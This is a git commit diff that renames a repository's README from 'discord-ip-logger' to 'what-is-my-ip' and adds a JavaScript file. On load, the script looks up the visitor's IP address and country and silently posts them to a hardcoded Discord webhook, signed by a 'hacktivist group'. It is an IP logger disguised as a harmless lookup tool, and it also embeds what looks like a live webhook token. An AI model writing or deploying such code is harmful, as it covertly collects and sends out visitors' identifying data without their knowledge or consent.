6f4d9efaab7ab607ba8c3f0f960575b30e866941
xan <121465198+fowummmm@users.noreply.github.com>
2023-03-30 07:24:16 -0500

    Add files via upload

--- README.md
+++ README.md
@@ -1,2 +1,1 @@
-# discord-ip-logger
-discord ip logger that sends their ip to a webhook
+# what-is-my-ip
---
+++ javascript.js
@@ -0,0 +1,36 @@
+var webHookUrl = "https://discord.com/api/webhooks/1090965693853347840/b9vyhsyuJEdrv_awWjnU0vHJDUXMBQA9dFYc4m1hCx_GU2PUtF7eKqrm33WePHnm7fXZ";
+
+$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
+  console.log(JSON.stringify(data, null, 2));
+});
+
+const request = async () => { // Calling a "synchronous" fetch
+    const response = await fetch('https://api.db-ip.com/v2/free/self');
+    const data = await response.json();
+    console.log(data);
+
+    // Declaring variables
+    var ip = data.ipAddress;
+    var country = data.countryName;
+
+    // Open POST Request
+    var postRequest = new XMLHttpRequest();
+    postRequest.open("POST", webHookUrl);
+
+    postRequest.setRequestHeader('Content-type', 'application/json');
+
+    var params = {
+        username:   "IP Log",
+        avatar_url: "",
+	content:    "**IP** By: Xanarchy Hacktivist Group \n" + 
+		    "__**:globe_with_meridians: IP Address:**__ \n" +
+                    "`" + ip + "` \n \n" +
+		    "__**Country:**__ \n" +
+		    "`" + country + "`"
+    }
+
+    postRequest.send(JSON.stringify(params));
+
+}
+
+request();
